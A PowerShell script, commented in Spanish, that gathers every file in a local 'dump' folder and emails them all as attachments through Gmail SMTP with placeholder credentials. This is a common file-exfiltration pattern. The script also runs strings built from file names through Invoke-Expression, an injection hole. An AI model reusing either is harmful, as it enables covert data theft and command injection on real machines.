#----------------------------------------
# ESPECIFICAMOS LA RUTA
$path = "C:/l/dump/"
#----------------------------------------
# OBTENEMOS LA CANTIDAD DE ARCHIVOS EN LA RUTA (-File => Solo Archivos, no carpetas)
$numero_archivos = (Get-ChildItem -Path "$path" -File).Count;
#---------------------------------------- 
# DECLARAMOS EL ARRAY LIST
$array_list_nombres = New-Object System.Collections.ArrayList
#---------------------------------------- 
# ASIGNAMOS LA RUTA A UNA VARIABLE
$archivos = Get-ChildItem -Path "$path" -File -Name
#---------------------------------------- 
# GUARDAMOS EN EL ARRAY LIST
$archivos | Where-Object {$array_list_nombres.Add($_)}
#----------------------------------------
# CREAMOS UN ARRAY LIST Y CREAMOS VARIABLES
$array_list_variables = New-Object System.Collections.ArrayList;for ($x=1; $x -le $numero_archivos; $x++) {$array_list_variables.Add("`$Ruta$x")}
#----------------------------------------
# JUNTAMOS EL ARREGLO NOMBRES CON VARIABLES
$array_list_nombres_y_variables = New-Object System.Collections.ArrayList;for ($n=0; $n -le ($numero_archivos -1); $n++) {$array_list_nombres_y_variables.Add($array_list_variables[$n]+" = `""+"$path" + $array_list_nombres[$n] + "`"")}
#-----------------------------------------------------------------
# CREAMOS UN ARRAY LIST Y CREAMOS VARIABLES ATTACHMENTS
$array_list_variables_attachment = New-Object System.Collections.ArrayList;for ($x=1; $x -le $numero_archivos; $x++) {$array_list_variables_attachment.Add("`$attachment$x")}
#----------------------------------------
# JUNTAMOS EL ARREGLO ATTACHMENT VARIABLES CON RUTAS
$array_list_attachment_y_rutas = New-Object System.Collections.ArrayList;for ($n=0; $n -le ($numero_archivos -1); $n++) {$array_list_attachment_y_rutas.Add($array_list_variables_attachment[$n] + " = " + "New-Object System.Net.Mail.Attachment("+$array_list_variables[$n]+")")}
#----------------------------------------
# JUNTAMOS EL ARREGLO SMTP Y VARIABLES ATTACHMENT
$array_list_SMTP_ADD = New-Object System.Collections.ArrayList;for ($n=0; $n -le ($numero_archivos -1); $n++) {$array_list_SMTP_ADD.Add("`$SMTPMessage.Attachments.Add("+$array_list_variables_attachment[$n]+")")}
#---------------------------------------


$EmailTo = "correoremitente@gmail.com";$EmailFrom = "correodestinatario@gmail.com";$Subject = "Asunto del correo";$Body = "Cuerpo del correo";$SMTPServer = "smtp.gmail.com"
# INVOCAMOS LAS VARIABLES QUE CONTIENEN TODO
for ($n=0; $n -le ($numero_archivos -1); $n++) {Invoke-Expression $array_list_nombres_y_variables[$n]};$SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)
# INVOCAMOS LAS VARIABLES QUE CONTIENEN TODO ATTACHMENT
for ($n=0; $n -le ($numero_archivos -1); $n++) {Invoke-Expression $array_list_attachment_y_rutas[$n]}
# INVOCAMOS LAS VARIABLES QUE CONTIENEN TODO SMTP ADD
for ($n=0; $n -le ($numero_archivos -1); $n++) {Invoke-Expression $array_list_SMTP_ADD[$n]}
$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("credenciales_del_correo@gmail.com", "contraseñadelcorreoqueusaremosparaenviar*");$SMTPClient.Send($SMTPMessage)
